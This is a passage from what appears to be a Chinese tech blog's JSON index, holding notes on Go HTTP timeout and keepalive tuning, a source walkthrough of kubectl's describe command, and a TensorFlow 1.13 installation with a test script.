golang超时问题\n\ngolang中http请求经常遇到的问题，本人也遇到过超时的情况。写个笔记记录下。\n\n当在编写一个Go语言的HTTP服务端或者是客户端时，超时是最容易同时也是最敏感的错误，有很多选择，一个错误可以导致很长时间没有结果，知道网络出现故障，或者进程宕掉。\n\n在分析过程中，发现服务之间调用有EOF的问题，一般情况下是两个服务之间的readtimeout和writetimeout设置超时导致的。当然也有一个keepalive超时的问题。需要保证服务A调用服务B的时候，服务A的keepalive大于服务B的keepalive。\n\npython服务器gunicon在设置keepalive的时候，之前遇到过默认情况的keepalive时间给了5s钟，遇到服务A的keepalive时间大于60s的时候，可能服务B的连接已经断开了，但是服务A还维持的会话，当获取数据的时候发现读取数据失败返回EOF问题了。\n\n建议保证：服务B的Keepalive时间 > 服务A的keepalive时间\n\n![HTTP server phases](http://img.kuqin.com/upimg/allimg/160720/2036151E2-0.png)\n\n![HTTP Client phases](http://img.kuqin.com/upimg/allimg/160720/2036154434-1.png)\n\n### 参考资料\n\nhttps://studygolang.com/articles/7692\n","tags":["golang"],"categories":["golang"]},{"title":"kubectl 学习笔记","url":"/2017/05/26/kubectl/","content":"\n\n## kubectl 学习笔记\n\n思考：kubectl 和docker命令源码的设计思想类似。\n\ndocker中启动了服务器接受请求注册*api*, 而kubectl发送命令给apiserver请求数据或者创建资源。\n\nCmds是kubectl中的命令集合，所有命令都会整理在里面。\n\nCmd 是命令的实体，其中主要是具体执行用户命令。每个cmd负责一个命令执行类型(describe,get...)。\n\nBuilder 是cmd执行操作时的辅助工具，主要是负责封装与Apiserver交互的底层操作，和将Apiserver的返回数据转化为统一数据结构。\n\nKubectl 依赖于[cobra](https://github.com/spf13/cobra)包构建命令行支持，该包是支持通用的命令行构建库。\n\n```\nCmds(命令集合)<---Cmd(命令obj)\n       |          |\n       |          |\n       |          | \n       |        Builder\n       |          |\n       |          |  \n       |----------Cmd(命令obj)\n```\n\nKubectl 的执行流程分析以describe命令分析。\n\n1. 用户发起请求\n2. 根据用户执行动作分发给处理对应动作的Cmd (Cmd是执行用户命令的实体)\n3. 解析用户命令\n4. 向Apiserver获取数据\n5. 整理返回为通用的数据集合\n6. 找到解释查询类型数据的句柄\n7. 使用具柄对整理出的数据集合进行打印输出\n\n```\nkubectl describe node node1\n```\n\n如下, NewKubectlCommand 方法中cobra会根据命令动作将请求分配给describe注册的cmd。\n\n```\ngroups := templates.CommandGroups{\n        //...\n        {\n            Message: \"Troubleshooting and Debugging Commands:\",\n            Commands: []*cobra.Command{\n                NewCmdDescribe(f, out, err),    //<------describe操作的cmd\n                NewCmdLogs(f, out),\n                NewCmdAttach(f, in, out, err),\n                NewCmdExec(f, in, out, err),\n                NewCmdPortForward(f, out, err),\n                NewCmdProxy(f, out),\n                NewCmdCp(f, out, err),\n                auth.NewCmdAuth(f, out, err),\n            },\n        },\n        {\n            Message: \"Advanced Commands:\",\n            Commands: []*cobra.Command{\n                NewCmdApply(\"kubectl\", f, out, err),\n                NewCmdPatch(f, out),\n                NewCmdReplace(f, out),\n                NewCmdConvert(f, out),\n            },\n        },\n        // ...\n    }\n    groups.Add(cmds)\n```\n\nCmd会对获取用户输入数据， 并检查正确性然后使用Run函数处理。\n\n```\nfunc NewCmdDescribe(f cmdutil.Factory, out, cmdErr io.Writer) *cobra.Command {\n    options := &resource.FilenameOptions{}\n    describerSettings := &printers.DescriberSettings{}\n\n    validArgs := printersinternal.DescribableResources()\n    argAliases := kubectl.ResourceAliases(validArgs)\n\n    cmd := &cobra.Command{\n        Use:     \"describe (-f FILENAME | TYPE [NAME_PREFIX | -l label] | TYPE/NAME)\",\n        Short:   i18n.T(\"Show details of a specific resource or group of resources\"),\n        Long:    describeLong + \"\\n\\n\" + cmdutil.ValidResourceTypeList(f),\n        Example: describeExample,\n        Run: func(cmd *cobra.Command, args []string) {   // <------处理回调函数\n            err := RunDescribe(f, out, cmdErr, cmd, args, options, describerSettings)\n            cmdutil.CheckErr(err)\n        },\n        ValidArgs:  validArgs,     //<-----------------合法性检查 \n        ArgAliases: argAliases,\n    }\n    usage := \"containing the resource to describe\"\n    cmdutil.AddFilenameOptionFlags(cmd, options, usage)\n    \n    // 下面主要是输入参数检查 \n    \n    cmd.Flags().StringP(\"selector\", \"l\", \"\", \"Selector (label query) to filter on, supports '=', '==', and '!='.(e.g. -l key1=value1,key2=value2)\")\n    cmd.Flags().Bool(\"all-namespaces\", false, \"If present, list the requested object(s) across all namespaces. Namespace in current context is ignored even if specified with --namespace.\")\n    cmd.Flags().BoolVar(&describerSettings.ShowEvents, \"show-events\", true, \"If true, display events related to the described object.\")\n    cmdutil.AddInclude3rdPartyFlags(cmd)\n    cmdutil.AddIncludeUninitializedFlag(cmd)\n    return cmd\n}\n```\n\n如下, 在 RunDescribe 中时对该命令的具体处理\n\n- Builder(), Unstructured(), ContinueOnError().\n   NamespaceParam(), FilenameParam(), LabelSelectorParam() ... Flatten() 的链式调用流程主要是为执行命令做准备。\n- Do() 函数是注册具体向Apiserver请求数据，和讲返回数据转化为通用结构的方法。\n- 最后的 describer.Describe（） 函数是将提取出的返回数据 打印出来做可视化接口。\n\n```\nfunc RunDescribe(f cmdutil.Factory, out, cmdErr io.Writer, cmd *cobra.Command, args []string, options *resource.FilenameOptions, describerSettings *printers.DescriberSettings) error {\n    \n    // ...\n\n    // include the uninitialized objects by default\n    // unless user explicitly set --include-uninitialized=false\n    includeUninitialized := cmdutil.ShouldIncludeUninitialized(cmd, true)\n    r := f.NewBuilder().\n        Unstructured().\n        ContinueOnError().\n        NamespaceParam(cmdNamespace).DefaultNamespace().AllNamespaces(allNamespaces).\n        FilenameParam(enforceNamespace, options).\n        LabelSelectorParam(selector).    // 设置用户的标签选择\n        IncludeUninitialized(includeUninitialized).\n        ResourceTypeOrNameArgs(true, args...). // 提取用户选择操作的对象类型\n        Flatten().                             //决定以何种方式从K8s的返回数据中提取信息                     \n        Do()                                   //执行命令获取数据\n    \n    // ...\n    \n    infos, err := r.Infos()                     \n    if err != nil {\n        if apierrors.IsNotFound(err) && len(args) == 2 {\n            return DescribeMatchingResources(f, cmdNamespace, args[0], args[1], describerSettings, out, err)\n        }\n        allErrs = append(allErrs, err)\n    }\n\n    errs := sets.NewString()\n    first := true\n    for _, info := range infos {\n        mapping := info.ResourceMapping()\n        describer, err := f.Describer(mapping)\n        if err != nil {\n            if errs.Has(err.Error()) {\n                continue\n            }\n            allErrs = append(allErrs, err)\n            errs.Insert(err.Error())\n            continue\n        }\n        // 下面通过describe 方法将提取到的数据 打印出来\n        s, err := describer.Describe(info.Namespace, info.Name, *describerSettings)\n        if err != nil {\n            if errs.Has(err.Error()) {\n                continue\n            }\n            allErrs = append(allErrs, err)\n            errs.Insert(err.Error())\n            continue\n        }\n        if first {\n            first = false\n            fmt.Fprint(out, s)\n        } else {\n            fmt.Fprintf(out, \"\\n\\n%s\", s)\n        }\n    }\n\n    return utilerrors.NewAggregate(allErrs)\n}\n```\n\n下面具体分析获取数据的流程，获取数据包括从Apiserver请求数据以及从返回信息中提取有用数据两个操作。\n\nRetrieveLazy 中注册了从Apiserver获取数据的操作。\nNewDecoratedVisitor 中注册了从获取到的数据结构中转化出通用数据的方法。\n\n```\n// inputs are consumed by the first execution - use Infos() or Object() on the Result to capture a list\n// for further iteration.\nfunc (b *Builder) Do() *Result {\n    r := b.visitorResult()\n    //... \n    \n    helpers := []VisitorFunc{}\n    //注册获取数据前的动作\n    if b.defaultNamespace {\n        helpers = append(helpers, SetNamespace(b.namespace))\n    }\n    if b.requireNamespace {\n        helpers = append(helpers, RequireNamespace(b.namespace))\n    }\n    helpers = append(helpers, FilterNamespace)\n    if b.requireObject {\n        //注册从Apiserver获取数据的方法\n        helpers = append(helpers, RetrieveLazy) \n    }\n    //注册从返回数据中提取信息的方法\n    r.visitor = NewDecoratedVisitor(r.visitor, helpers...)\n    if b.continueOnError {\n        r.visitor = ContinueOnErrorVisitor{r.visitor}\n    }\n    return r\n}\n```\n\n```\n// RetrieveLazy updates the object if it has not been loaded yet.\nfunc RetrieveLazy(info *Info, err error) error {\n    if err != nil {\n        return err\n    }\n    if info.Object == nil {\n        return info.Get()     //从Apiserver获取数据\n    }\n    return nil\n}\n```\n\n而 NewDecoratedVisitor 方法注册了数据处理的关键函数 Visit， 这个函数可以使用户可以将来自Apiserver的数据转化为通用数据集合。\n\n```\n// NewDecoratedVisitor will create a visitor that invokes the provided visitor functions before\n// the user supplied visitor function is invoked, giving them the opportunity to mutate the Info\n// object or terminate early with an error.\nfunc NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor {\n    if len(fn) == 0 {\n        return v\n    }\n    return DecoratedVisitor{v, fn}\n}\n\n// Visit implements Visitor\nfunc (v DecoratedVisitor) Visit(fn VisitorFunc) error {\n    return v.visitor.Visit(func(info *Info, err error) error {\n        if err != nil {\n            return err\n        }\n        for i := range v.decorators {\n            if err := v.decorators[i](info, nil); err != nil {\n                return err\n            }\n        }\n        return fn(info, nil)\n    })\n}\n```\n\n打印提取到的数据主要是调用注册的describe方法，会根据用户的请求如下获取对应的describe\n\n```\ndescriber, err := f.Describer(mapping)\n```\n\nDescribe 集合中注册了 对K8s各种数据的打印方法(针对visit转化后的通用数据)\n\n```\nfunc init() {\n    d := &Describers{}\n    err := d.Add(\n        describeLimitRange,\n        describeQuota,\n        describePod,\n        describeService,\n        describeReplicationController,\n        describeDaemonSet,\n        describeNode,              //打印节点\n        describeNamespace,\n    )\n    if err != nil {\n        glog.Fatalf(\"Cannot register describers: %v\", err)\n    }\n    DefaultObjectDescriber = d\n}\n```\n\n使用获取到的对应的Describe作打印\n\n```\n//遍历整理出的返回信息\nfor _, info := range infos {\n        // 执行打印操作\n        s, err := describer.Describe(info.Namespace, info.Name, *describerSettings)\n        // ...\n    }\n```\n\n\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"tensorflow环境安装","url":"/2017/05/26/tensorflow安装小结/","content":"\n## 深度学习环境 tensorflow安装\n\n### 环境准备\n\n需要支持RTX2080ti显卡，最好有11g现存。\n\n本人使用CUDA10.1，cudnn 10.1适配。\n\npython3.7 pycharm安装。\n\nanaconde3 安装多次使用了 anaconde3 4.4 版本安装上了。\n\n之后安装tensorflow，安装版本1.13版本的支持10.1的版本的tensorflow.\n\n### 运行测试\n\n```python\n# -*- coding: utf-8 -*-\n\nimport tensorflow as tf\n\n# 创建一个变量, 初始化为标量 0.\nstate = tf.Variable(0, name=\"counter\")\n\n# 创建一个 op, 其作用是使 state 增加 1\none = tf.constant(1)\nnew_value = tf.add(state, one)\nupdate = tf.assign(state, new_value)\n\n# 启动图后, 变量必须先经过`初始化` (init) op 初始化,\n# 首先必须增加一个`初始化` op 到图中.\n# initialize_all_variables 警告换成 global_variables_initializer\ninit_op = tf.global_variables_initializer()\n\n# 启动图, 运行 op\nwith tf.Session() as sess:\n    # 运行 'init' op\n    sess.run(init_op)\n    # 打印 'state' 的初始值\n    print(sess.run(state))\n    # 运行 op, 更新 'state', 并打印 'state'\n    for i in range(3):\n        sess.run(update)\n        print(sess.run(state))\n```\n\n运行成功则正常。\n\n开启旅程啦~~\n","tags":["深度学习"],"categories":["深度学习"]}]